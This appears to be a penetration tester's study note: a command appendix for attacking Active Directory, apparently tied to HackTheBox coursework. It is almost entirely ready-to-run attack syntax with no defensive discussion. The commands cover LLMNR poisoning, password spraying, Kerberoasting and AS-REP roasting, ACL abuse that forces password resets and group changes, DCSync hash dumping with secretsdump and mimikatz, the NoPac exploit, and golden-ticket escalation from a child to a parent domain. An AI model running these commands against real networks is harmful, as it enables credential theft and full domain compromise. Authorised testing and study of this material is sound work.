# Active Directory Command Appendix

Pure syntax reference — phase-ordered coverage is in [[Active Directory Methodology]], teardowns in [[Active Directory (Breakdowns)]], decision logic in [[Active Directory (Decision Tree)]].

Cross-links: [[Active Directory Enumeration & Attacks (HTB Supplementary)]]

---

## External Recon

```bash
# DNS TXT record lookup
nslookup -type=TXT DOMAIN.LOCAL <nameserver>

# Extract DC FQDN from TLS cert on RDP/LDAPS (no auth required)
sudo nmap -A -sV -p 3389,636,443 <DC_IP> | grep -i "commonname\|CN="

# Parse grepable nmap for hosts with a specific port open
awk '/1433\/open/ {print $2}' nmap_output.txt
```

---

## LLMNR/NBT-NS Poisoning

```bash
# From Linux (Kali) — Responder
sudo responder -I <interface> -wF

# Crack captured NTLMv2
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

```powershell
# From Windows foothold — Inveigh
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
# After stopping: type Inveigh-NTLMv2.txt
```

---

## Password Policy

```bash
# Linux (authenticated)
crackmapexec smb <DC_IP> -u user -p pass --pass-pol
rpcclient -U "DOMAIN\\user%pass" <DC_IP> -c "getdompwinfo"
enum4linux -P <DC_IP>
```

```powershell
# Windows (PowerView)
(Get-DomainPolicy)."system access"
```

---

## Username Enumeration

```bash
# kerbrute (no lockout risk)
kerbrute userenum -d DOMAIN.LOCAL --dc <DC_IP> users.txt

# rpcclient individual user by RID (hex)
rpcclient -U "DOMAIN\\user%pass" <DC_IP> -c "queryuser 0x457"
```

---

## Password Spraying

```bash
# Linux
kerbrute passwordspray -d DOMAIN.LOCAL --dc <DC_IP> users.txt 'Password123!'
crackmapexec smb <target> -u users.txt -p 'Password123!' --continue-on-success
```

```powershell
# Windows (DomainPasswordSpray — auto-pulls user list from AD)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spray_success.txt -ErrorAction SilentlyContinue
```

---

## Credentialed Enumeration

```bash
# CME: groups with member counts
crackmapexec smb <DC_IP> -u user -p pass --groups

# CME: shares
crackmapexec smb <DC_IP> -u user -p pass --shares

# CME: logged-on users
crackmapexec smb <DC_IP> -u user -p pass --loggedon-users

# bloodhound-python remote collection
bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all
zip -r bh_data.zip *.json
```

```powershell
# PowerView — core enumeration
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-DomainUser | select samaccountname,lastlogon
Get-DomainGroup "Domain Admins" | select member
Get-DomainComputer | select dnshostname,operatingsystem
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Test local admin access
Test-AdminAccess -ComputerName <hostname>

# SPN enumeration
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
setspn -Q */*

# UAC flag hunting
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter PASSWD_NOTREQD
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}

# Domain SID
Get-DomainSID

# Trust mapping
Get-DomainTrustMapping
```

```cmd
:: Windows built-in (no tools)
net user /domain
net group /domain
net localgroup Administrators
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount>=1)(description=*))" -attr samAccountName description -limit 50
Get-MpComputerStatus
netdom query /domain:DOMAIN.LOCAL trust
```

---

## ACL Enumeration

```powershell
# Get current user's SID
$sid = Convert-NameToSid <username>

# Enumerate ACLs where current user has access
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Scope to OU for speed
Get-DomainObjectACL -ResolveGUIDs -Identity * -domain DOMAIN.LOCAL \
  -SearchBase "LDAP://OU=Users,DC=DOMAIN,DC=LOCAL"
```

GUID to know: `00299570-246d-11d0-a768-00aa006e0529` = User-Force-Change-Password

---

## ACL Abuse Chain

```powershell
# Step 1: ForceChangePassword
$passwd = ConvertTo-SecureString "victimpass" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\attacker', $passwd)
$newPass = ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force
Set-DomainUserPassword -Identity <target> -AccountPassword $newPass -Credential $Cred -Verbose

# Step 2: Add to group
$Cred2 = New-Object System.Management.Automation.PSCredential('DOMAIN\<target>', $newPass)
Add-DomainGroupMember -Identity 'Privileged Group' -Members '<target>' -Credential $Cred2 -Verbose

# Step 3: Set SPN for targeted Kerberoasting
Set-DomainObject -Credential $Cred2 -Identity <high_value_user> \
  -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Step 4: Kerberoast
.\Rubeus.exe kerberoast /user:<high_value_user> /nowrap
# hashcat -m 13100

# Cleanup
Set-DomainObject -Credential $Cred2 -Identity <high_value_user> -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity 'Privileged Group' -Members '<target>' -Credential $Cred2 -Verbose
```

---

## Kerberoasting

```bash
# Linux
GetUserSPNs.py -request -dc-ip <DC_IP> DOMAIN.LOCAL/user:pass
# hashcat -m 13100 tgs.hash rockyou.txt
```

```cmd
:: Windows
.\Rubeus.exe kerberoast /nowrap
.\Rubeus.exe kerberoast /user:<specific_user> /nowrap
:: hashcat -m 13100
```

---

## AS-REP Roasting

```bash
# Linux (no credentials needed if accounts have pre-auth disabled)
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asrep.hash DOMAIN.LOCAL/
# hashcat -m 18200 asrep.hash rockyou.txt
```

```cmd
:: Windows (Rubeus — format:hashcat required for hashcat compatibility)
.\Rubeus.exe asreproast /format:hashcat /nowrap
:: hashcat -m 18200
```

---

## DCSync

```bash
# From Linux
impacket-secretsdump -dc-ip <DC_IP> DOMAIN.LOCAL/user:pass@<DC_IP>
# Or just one user:
impacket-secretsdump -dc-ip <DC_IP> -just-dc-user krbtgt DOMAIN.LOCAL/user:pass@<DC_IP>
```

```mimikatz
# From Windows (requires DS-Replication rights)
lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\krbtgt
# For reversible encryption cleartext:
lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\syncron
```

```cmd
:: runas /netonly to use domain creds from non-domain machine
runas /netonly /user:DOMAIN\user "cmd.exe"
:: Then run mimikatz lsadump::dcsync in the new window
```

---

## Privileged Access

```powershell
# WinRM with explicit creds
$passwd = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $passwd)
Enter-PSSession -ComputerName <target> -Credential $cred
```

```bash
# MSSQL with Windows Authentication
mssqlclient.py DOMAIN.LOCAL/user:pass@<SQL_IP> -windows-auth
# Inside: enable_xp_cmdshell  →  xp_cmdshell whoami
```

---

## Bleeding Edge

```bash
# NoPac (CVE-2021-42278 + CVE-2021-42287)
python3 scanner.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -use-ldap
python3 noPac.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -use-ldap \
  -shell --impersonate administrator
```

---

## Domain Trust Attacks

```powershell
# Enumerate trusts
Get-DomainTrustMapping
netdom query /domain:DOMAIN.LOCAL trust

# Get child domain SID
Get-DomainSID

# Get Enterprise Admins SID from parent
Get-DomainObject -Identity "Enterprise Admins" -Domain PARENT.LOCAL
```

```mimikatz
# DCSync child KRBTGT
lsadump::dcsync /user:CHILD\krbtgt
```

```cmd
:: ExtraSids Golden Ticket (child→parent)
.\Rubeus.exe golden /rc4:<child_krbtgt_hash> /domain:CHILD.PARENT.LOCAL ^
  /sid:<child_sid> /sids:<enterprise_admins_sid> /user:hacker /ptt
klist
```

```bash
# Linux — raiseChild.py (automated)
impacket-raiseChild -target-exec DC01.PARENT.LOCAL CHILD.PARENT.LOCAL/Administrator:pass

# Cross-forest Kerberoasting (Linux)
GetUserSPNs.py -target-domain FOREIGN.LOCAL OUROWN.LOCAL/user:pass -dc-ip <DC_IP> -request
# hashcat -m 13100 → use creds: smbexec.py FOREIGN.LOCAL/user:pass@<foreign_ip>
```

```cmd
:: Cross-forest Kerberoasting (Windows)
.\Rubeus.exe kerberoast /domain:FOREIGN.LOCAL /rc4opsec /nowrap
```

---

#### Tags: #CommandAppendix #ActiveDirectory #ADEnum #Kerberoasting #ACLAbuse #DCSync #DomainTrust #ExtraSids #NoPac #HTBSupplementary
